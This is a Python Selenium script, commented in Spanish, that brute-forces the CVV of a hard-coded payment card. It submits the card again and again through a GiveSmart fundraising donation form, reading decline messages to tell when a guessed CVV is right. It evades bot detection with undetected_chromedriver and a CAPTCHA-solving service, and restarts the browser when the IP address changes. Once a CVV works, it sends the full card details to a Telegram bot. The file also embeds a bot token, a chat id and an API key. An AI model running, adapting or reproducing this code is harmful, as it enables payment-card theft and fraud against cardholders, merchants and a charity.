import undetected_chromedriver as uc
from selenium.common.exceptions import WebDriverException, TimeoutException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import requests
import time
import sys
from nextcaptcha import NextCaptchaAPI  # Importa NextCaptchaAPI

# Desactivar el logging de terceros
import logging
logging.getLogger().setLevel(logging.CRITICAL)

bot_token = '7449000581:AAF07hXqSjg2tUpFpUtYbsernZeTUg_S_ec'
chat_id = '6657044507'
client_key = 'next_921f3d5c3d9930a160d3c1b3953adb8b82'

def enviar_mensaje(mensaje):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {'chat_id': chat_id, 'text': mensaje}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print('Mensaje enviado con éxito.')
        return True
    else:
        print('Error al enviar el mensaje.')
        return False

# Función para resolver captcha usando NextCaptcha
def resolver_captcha():
    api = NextCaptchaAPI(client_key=client_key)
    try:
        result = api.recaptchav2(
            website_url="https://fundraise.givesmart.com/e/v_rTLQ?vid=18sgmm",
            website_key="6LfBpAQTAAAAACzGg-UQh-9MQLCY6hI_Qlp-oDrO"
        )
        return result['solution']['gRecaptchaResponse'][:50] + "..."  # Solo para mostrar los primeros caracteres
    except Exception as e:
        print(f"Error al resolver el captcha: {e}")
        return None  # Devuelve None si falla la resolución del captcha

# Función para iniciar el navegador centrado en pantalla y casi a pantalla completa
def Start():
    try:
        options = uc.ChromeOptions()
        
        # Configura las dimensiones y posición de la ventana para estar centrada
        screen_width = 1920  # Ajusta estos valores según la resolución de tu pantalla
        screen_height = 1080
        window_width = 1920  # Ancho deseado para el navegador
        window_height = 1080   # Altura deseada para el navegador
        position_x = (screen_width - window_width) // 2
        position_y = (screen_height - window_height) // 2
        
        # Pasamos las dimensiones y posición a las opciones de Chrome
        options.add_argument(f"--window-size={window_width},{window_height}")
        options.add_argument(f"--window-position={position_x},{position_y}")
        
        bot = uc.Chrome(options=options)
        url = "https://fundraise.givesmart.com/e/v_rTLQ?vid=18q311"
        return bot, url
    except WebDriverException as e:
        print(f"Error al iniciar el navegador: {e}")
        return None, None  # Devuelve None si falla

def check_internet():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        current_ip = response.text
        return True, current_ip
    except requests.ConnectionError:
        return False, None

bot, url = Start()
if bot is None:
    sys.exit("Error crítico: No se pudo iniciar el navegador debido a una incompatibilidad con ChromeDriver.")

ceciliape = '4547 7512 1922 6446'
fechape = '07/2029'
spliter = fechape.split('/')
x = 458 #cvv
last_ip = None

while True:
    has_internet, current_ip = check_internet()
    if not has_internet or (last_ip is not None and current_ip != last_ip):
        print("Cambio de IP o pérdida de conexión detectada. Cerrando ChromeDriver y reconectando en 10 segundos...")
        bot.quit()  # Cierra la instancia de ChromeDriver
        time.sleep(10)
        bot, url = Start()  # Reabre la instancia de ChromeDriver
        if bot is None:
            sys.exit("Error crítico: No se pudo reiniciar el navegador.")
        print("Reconectado. Reanudando en el número:", x)
        last_ip = current_ip  # Actualizamos la IP con la nueva IP obtenida después de reconectar
        continue  # Reiniciar el bucle desde el mismo número x

    try:
        bot.get(url)
        click = WebDriverWait(bot, 30).until(
            EC.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div[1]/div[1]/div[1]/div[1]/div/header/button'))
        ).click()

        numero_con_ceros = str(x).zfill(3)

        iframe = bot.find_element(By.CSS_SELECTOR, "#appDrawerContent > iframe")
        bot.switch_to.frame(iframe)
        time.sleep(2.5)

        # Llenado de formulario
        nombre = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '#first_name')))
        nombre.send_keys("Martín Noriega")
        
        # Revisa conexión mientras rellena datos
        has_internet, current_ip = check_internet()
        if not has_internet or (last_ip is not None and current_ip != last_ip):
            print("Cambio de IP o pérdida de conexión detectada durante el llenado de datos. Reconectando en 10 segundos...")
            bot.quit()  # Cierra ChromeDriver
            time.sleep(10)
            bot, url = Start()  # Reabre ChromeDriver
            if bot is None:
                sys.exit("Error crítico: No se pudo reiniciar el navegador.")
            last_ip = current_ip
            print("Reconectado. Reanudando en el número:", x)
            continue

        apellid = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[11]/div[2]/div/input')))
        apellid.send_keys("quinonez sebastia")
        num = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[12]/div[1]/div/input')))
        num.send_keys("9267710097")
        corre = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[12]/div[2]/div/input')))
        corre.send_keys("uinonez.sebastian@alaniz.info")
        direc = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[13]/div/div/input')))
        direc.send_keys("Cl. Alessandra Barreto # 6 Dpto. 965 San Lucía, Lima")
        
        # Selección de ciudad y estado
        ciuda = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[14]/div/div/input')))
        ciuda.send_keys("lima")
        select_element = WebDriverWait(bot, 30).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#state")))
        select = Select(select_element)
        select.select_by_value("AK")
        
        zip = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[15]/div[2]/div/input')))
        zip.send_keys("10005")
        
        # Información de tarjeta de crédito
        cc = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[18]/div[2]/div[4]/div[1]/div/div/div/div[1]/div/input')))
        cc.send_keys(ceciliape)
        fecha = Select(WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[18]/div[2]/div[4]/div[2]/div[1]/div[1]/div[2]/select'))))
        fecha.select_by_value(spliter[0])
        ano = Select(WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[18]/div[2]/div[4]/div[2]/div[1]/div[1]/div[4]/select'))))
        ano.select_by_value(spliter[1])
        cvv = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[18]/div[2]/div[4]/div[2]/div[2]/div/div[1]/div/div/input')))
        cvv.send_keys(numero_con_ceros)
        
        # Resolver el CAPTCHA usando NextCaptcha
        captcha_code = resolver_captcha()
        if captcha_code is None:
            print("Error al resolver el CAPTCHA. Reintentando la misma iteración...")
            continue  # Reintentar la misma iteración sin incrementar x

        textarea = WebDriverWait(bot, 10).until(EC.presence_of_element_located((By.ID, "g-recaptcha-response")))
        bot.execute_script(f"document.getElementById('g-recaptcha-response').innerHTML = '{captcha_code}';")
        
        # Enviar formulario
        submit = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/form/div/div[21]/div/button')))
        submit.click()
    
        # Validación del resultado
        result = WebDriverWait(bot, 30).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/div/div/div/div[2]/div/div/div/button[3]')))
        result.click()

        # Comprobación de mensajes de error
        try:
            error_element = WebDriverWait(bot, 10).until(EC.visibility_of_element_located((By.CLASS_NAME, "alert-danger")))
            error_text = error_element.text
            if "Decline" in error_text and "CVV2" not in error_text:
                print(numero_con_ceros + " -> CVV correcto!")
                if enviar_mensaje(ceciliape + ":" + fechape + ":" + numero_con_ceros):
                    break  # Salir del bucle si el mensaje se envió con éxito
            elif "CVV2 Declined" in error_text:
                print(numero_con_ceros + " -> No es el CVV")
            else:
                print("Error no reconocido:", error_text)
        except TimeoutException:
            print("No se encontró ningún mensaje de error. Reiniciando ChromeDriver rápidamente...")
            bot.quit()  # Cierra rápidamente el navegador
            time.sleep(3)  # Espera 3 segundos antes de reiniciar
            bot, url = Start()  # Reabre ChromeDriver
            if bot is None:
                sys.exit("Error crítico: No se pudo reiniciar el navegador.")
            print("Reiniciado rápidamente. Reanudando en el número:", x)
            continue  # Reintenta la misma iteración sin incrementar x
        
        x += 1  # Solo incrementar x cuando todo el proceso fue exitoso
        time.sleep(4)
        bot.refresh()
        time.sleep(1)  # Esperar 5 segundos entre cada refresco automático
    except TimeoutException as te:
        print("Error de tiempo de espera: No se pudo encontrar el elemento a tiempo. Reiniciando ChromeDriver...")
        bot.quit()  # Cierra la instancia de ChromeDriver
        time.sleep(3)  # Espera 3 segundos
        bot, url = Start()  # Reabre ChromeDriver
        if bot is None:
            sys.exit("Error crítico: No se pudo reiniciar el navegador.")
        print("Reiniciado. Reanudando en el número:", x)
        continue
    except NoSuchElementException as ne:
        print("Error: No se encontró un elemento necesario. Reiniciando ChromeDriver...")
        bot.quit()  # Cierra la instancia de ChromeDriver
        time.sleep(3)  # Espera 3 segundos
        bot, url = Start()  # Reabre ChromeDriver
        if bot is None:
            sys.exit("Error crítico: No se pudo reiniciar el navegador.")
        print("Reiniciado. Reanudando en el número:", x)
        continue
    except WebDriverException as we:
        print(f"Error en WebDriver: {we}. Reiniciando ChromeDriver...")
        bot.quit()  # Cierra la instancia de ChromeDriver
        time.sleep(3)  # Espera 3 segundos
        bot, url = Start()  # Reabre ChromeDriver
        if bot is None:
            sys.exit("Error crítico: No se pudo reiniciar el navegador.")
        print("Reiniciado. Reanudando en el número:", x)